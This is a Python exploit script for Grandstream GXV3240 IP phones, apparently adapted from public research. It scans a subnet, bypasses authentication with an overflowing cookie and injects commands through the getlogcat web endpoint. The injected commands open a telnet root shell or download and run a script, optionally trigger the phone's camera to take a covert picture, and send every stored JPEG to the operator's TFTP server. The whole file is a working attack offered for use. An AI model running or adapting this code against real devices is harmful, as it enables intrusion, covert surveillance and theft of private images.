#!/usr/bin/env python2

# Grandstream GVX3240 camera exploit
# Based on the work of Brendan Scarvell.
# https://github.com/scarvell/grandstream_exploits

import sys, urllib2, os, base64, time, telnetlib, optparse, re, socket, tftpy, signal, logging
from threading import *


# Define console colours
class bcolors:
    #PURPLE = '\033[95m'
    #BLUE = '\033[94m'
    #GREEN = '\033[92m'
    #YELLOW = '\033[93m'
    #RED = '\033[91m'
    #RESET = '\033[0m'
    #BOLD = '\033[1m'
    #UNDERLINE = '\033[4m'

    # For Windows, us eteh blank values below and comment out the above
    PURPLE = ''
    BLUE = ''
    GREEN = ''
    YELLOW = ''
    RED = ''
    RESET = ''
    BOLD = ''
    UNDERLINE = ''


# Cleanup routine
def cleanup():
    print bcolors.YELLOW + '[+] Cleanup...' + bcolors.RESET

    # Get TFTP process PID
    f = open('getcam.PID', 'r')
    PID = f.read()
    f.close()

    # Delete files & folder
    if os.path.exists('getcam.PID'):
        os.remove('getcam.PID')
    if os.path.exists('tftp-cam/tftp.sh'):
        os.remove('tftp-cam/tftp.sh')

    print bcolors.GREEN + '[+] Finished.' + bcolors.RESET
    print bcolors.YELLOW + '[-] Killing TFTP Server PID...' + bcolors.RESET
    os.kill(int(PID), signal.SIGTERM)
    time.sleep(1)


# Define TFTP Server sub
def function_tftpd():
    PID=os.getpid()

    # Write PID to file
    f = open('getcam.PID', 'w')
    f.write(str(PID))
    f.close()

    # Create tftp server folder
    if not os.path.exists('tftp-cam'):
        os.mkdir('tftp-cam')

    # Create shell file to exfiltrate images (required by exploitHost2 2nd exploit attempt)
    f = open('tftp-cam/tftp.sh','w')
    f.write('cd /mnt/sdcard/DCIM/Camera ; for IMAGES in *.jpg ; do tftp -p -l $IMAGES -r $1-$IMAGES $2 ; done')
    f.close()

    # Set console logging level
    logging.getLogger('tftpy.TftpStates').setLevel(logging.CRITICAL)

    # Start TFTP Server
    try:
        server = tftpy.TftpServer('tftp-cam')
        server.listen('0.0.0.0', 69)
    except:
        print bcolors.RED + '[!] TFTP Server failed to initialise, exiting...' + bcolors.RESET
        cleanup()
        sys.exit()


# Get banners subroutine
def retBanner(ip, port, x):
    try:
        socket.setdefaulttimeout(1)
        skt = socket.socket()
        skt.connect((ip, port))
        if (port == 80):
            skt.send('GET /HTTP/1.1\r\n\r\n')

        banner = skt.recv(1024)
        banner_entries = re.split('\n+', banner)
        # Check response for serve type, else send back UNKNOWN
        banner = 'Server: UNKNOWN'
        for line in banner_entries:
            if 'Server:' in line:
                banner = line
                break
            elif 'snom' in line:
                banner = 'Server: SNOM'
                break
        skt.close()
        if banner:
            banner_list[x] = banner

        return banner

    except:
        skt.close()
        return


# Attempt 2nd exploit host routine
def exploitHost2(target_host, x):
    print bcolors.YELLOW + '[!] Attempt 2nd style exploit...' + bcolors.RESET

    if takePIC:
        payload = '{input,keyevent,KEYCODE_HOME}'
        print bcolors.BLUE + '[*] Deactivate screen saver...'
        pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
        pwn.add_header('Cookie', cookie)
        res = urllib2.urlopen(pwn, timeout = 5)
        time.sleep(1)

        payload = '{am,start,-a,android.media.action.STILL_IMAGE_CAMERA}'
        print '[*] Start Camera...'
        pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
        pwn.add_header('Cookie', cookie)
        res = urllib2.urlopen(pwn, timeout = 5)
        time.sleep(1)

        payload = '{input,touchscreen,tap,250,230}'
        print '[*] Deactivate first use screen...'
        pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
        pwn.add_header('Cookie', cookie)
        res = urllib2.urlopen(pwn, timeout = 5)
        time.sleep(1)

        payload = '{input,keyevent,KEYCODE_CAMERA}'
        print '[*] Take picture...'
        pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
        pwn.add_header('Cookie', cookie)
        res = urllib2.urlopen(pwn, timeout = 5)
        time.sleep(1)

        payload = '{am,force-stop,com.android.gallery3d}'
        print '[*] Close Camera...'
        pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
        pwn.add_header('Cookie', cookie)
        res = urllib2.urlopen(pwn, timeout = 5)
        time.sleep(1)


    payload = '{tftp,-g,-l,/sdcard/tftp.sh,-r,tftp.sh,' + str(host_ip) + '}'
    print '[*] Download TFTP script...'
    pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
    pwn.add_header('Cookie', cookie)
    res = urllib2.urlopen(pwn, timeout = 5)
    time.sleep(1)

    payload = '{chmod,+x,/sdcard/tftp.sh}'
    print '[*] Make script executable...'
    pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
    pwn.add_header('Cookie', cookie)
    res = urllib2.urlopen(pwn, timeout = 5)
    time.sleep(1)

    payload = '{/system/bin/sh,/sdcard/tftp.sh,B' + str(x) + ',' + str(host_ip) + '}'
    print '[*] Run script to exfiltrate images...'
    print bcolors.GREEN + '[*] Exploit completed. Images from this phone will be prefixed B' + str(x) + '-, check your TFTP server folder...' + bcolors.RESET
    pwn = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
    pwn.add_header('Cookie', cookie)
    res = urllib2.urlopen(pwn, timeout = 5)
    time.sleep(1)

    return


# Attempt to exploit host subroutine
def exploitHost(target_host, x):
    # Telnet port
    tn_port = str(666)

    # Inital payload for telnet access to phone
    #payload = '{telnetd,-l,sh}'                        # For testing exploit2
    payload = '{telnetd,-p,' + tn_port + ',-l,sh}'

    print '[*] Trying to exploit host: ' + target_host

    req = urllib2.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(target_host,PORT,payload))
    req.add_header('Cookie', cookie)
    res = urllib2.urlopen(req, timeout = 5)

    if 'Response=Success' not in res.read():
        print bcolors.RED + '[!] Exploit failed. Host may not be vulnerable' + bcolors.RESET
    else:
        time.sleep(2)
        try:
            tn = telnetlib.Telnet(target_host, tn_port)
        except:
            print bcolors.YELLOW + '[!] Exploit worked. buffer overflow failed...' + bcolors.RESET
            try:
                exploitHost2(target_host, x)
            except:
                print bcolors.RED + '[!] 2nd style exploit attempt failed!' + bcolors.RESET
            return

        time.sleep(1)


        if takePIC:
            tn_cmd = 'input keyevent KEYCODE_HOME ; am start -a android.media.action.STILL_IMAGE_CAMERA\n'
            try:
                if '#' not in tn.read_until('~ #'):
                    print bcolors.YELLOW + '[!] Exploit worked. buffer overflow failed...' + bcolors.RESET
                    try:
                        exploitHost2(target_host, x)
                    except:
                        print bcolors.RED + '[!] 2nd style exploit attempt failed!' + bcolors.RESET
                    return
            except:
                return

            tn.write(tn_cmd)
            tn.read_until('~ #')
            print bcolors.BLUE + '[*] Deactivate Screen Saver, activate Camera...'
            tn.write(tn_cmd)
            time.sleep(2)

            tn_cmd = 'input touchscreen tap 250 230 ; sleep 1 ; input keyevent KEYCODE_CAMERA ; sleep 1 ; am force-stop com.android.gallery3d\n'
            tn.read_until('~ #')
            print '[*] Clear any first use warning on Camera, take picture, close Camera...'
            tn.write(tn_cmd)
            time.sleep(1)


        tn_cmd = 'cd /mnt/sdcard/DCIM/Camera ; for IMAGES in *.jpg ; do tftp -p -l $IMAGES -r ' + str(x) + '-$IMAGES ' + host_ip + ' ; done\n'
        tn.read_until('~ #')
        print bcolors.BLUE + '[*] Exfiltrate images via TFTP...' + bcolors.RESET
        tn.write(tn_cmd)
        time.sleep(1)

        tn_cmd = 'killall telnetd\n'
        print bcolors.BLUE + '[*] Killing backdoor...' + bcolors.RESET
        tn.write(tn_cmd)
        time.sleep(1)

        try:
            tn.read_all()
            print bcolors.GREEN + '[*] Exploit completed. Images from this phone will be prefixed ' + str(x) + '-, check your TFTP server folder...' + bcolors.RESET
            return
        except:
            print bcolors.YELLOW + '[!] Exploit completed, timeout/error with TFP server...' + bcolors.RESET
            return


# Main Routine
def main():
    # Set global vars
    global banner_list
    global host_ip
    global PORT
    global cookie
    global takePIC

    # Parse commandline
    parser = optparse.OptionParser('commandline options: -t <target C class subnet)>, i.e. 172.24.100. [-s <local IP>] [-i CAM]')
    parser.add_option('-t', dest='targetHosts', type='string', help='Specify the target hosts class C subnet, i.e. 172.24.100. - do include the last DOT!')
    parser.add_option('-s', dest='localHost', type='string', help='Specify the local host IP')
    parser.add_option('-i', dest='takePIC', type='string', help='Specify CAM to take picture or leave out just to download images')

    (options, args) = parser.parse_args()

    if (options.targetHosts == None):
        print parser.usage
        sys.exit()

    # Get local IP address
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    host_ip = (s.getsockname()[0])
    s.close()

    if (options.localHost != None):
        host_ip = options.localHost

    takePIC = False
    if (options.takePIC == 'CAM'):
        takePIC = True

    target_hosts = options.targetHosts
    PORT = 80

    if host_ip[:host_ip.rfind('.')] != target_hosts[:target_hosts.rfind('.')]:
        print 'Local IP & target subnets do not match, auto detect did not work or you need to properly define local IP with -s parameter...'
        sys.exit()

    time.sleep(1)

    # Buffer overflow to bypass auth
    cookie = 'phonecookie=\"{}\"'.format('A'*93)

    print bcolors.RESET + '[+] Scanning subnet for HTTP Banners...'
    # Only 80 needed for phone web gui scanning...
    #portList = [21,22,23,80,8080]
    portList = [80]

    # Zero banner array list
    banner_list = []
    for x in range(255):
        banner_list.append('')

    # scan IP range
    for x in range(1, 254):
        ip = str(options.targetHosts) + str(x)
        for port in portList:
            t = Thread(target = retBanner, args = (ip, port, x))
            t.start()

    # Wait for all threads to complete
    t.join()

    # Start TFTP server as a thread
    t = Thread(target = function_tftpd)
    t.start()

    # Wait 5 secs to allows TFTP server to come up and folders/files to be prepped
    print '[!] Initialising TFTP server...'
    time.sleep(5)

    # Act on scan results in order
    for x in range(1, 255):
        ip = str(options.targetHosts) + str(x)
        if banner_list[x]:
            if 'Enterprise Phone' in  banner_list[x]:
                print '[+] ' + ip + ':80' + ' = ' + bcolors.GREEN + (banner_list[x]) + bcolors.RESET
            else:
                print '[+] ' + ip + ':80' + ' = ' + bcolors.YELLOW + (banner_list[x]) + bcolors.RESET

            if 'Enterprise Phone' in  banner_list[x]:
                print bcolors.GREEN + '[-] Testing host to see if Grandstream GXV3240...' + bcolors.RESET
                target_host = ip
                payload = '{telnetd,-l,sh}'
                req = urllib2.Request('http://{}:{}/manager?action=product&format=json&jsoncallback=?;{}'.format(target_host,PORT,payload))
                req.add_header('Cookie', cookie)
                res = urllib2.urlopen(req)

                if 'GXV3240' not in res.read():
                    print bcolors.RED + '[!] Not a Grandstream GXV3240!' + bcolors.RESET
                else:
                    print bcolors.PURPLE + '[*] Phone is a Grandstream GXV3240, proceeding with exploit...' + bcolors.RESET
                    exploitHost(target_host, x)

    # Cleanup befor exiting
    cleanup()


# Start script
if __name__ == '__main__':
    main()
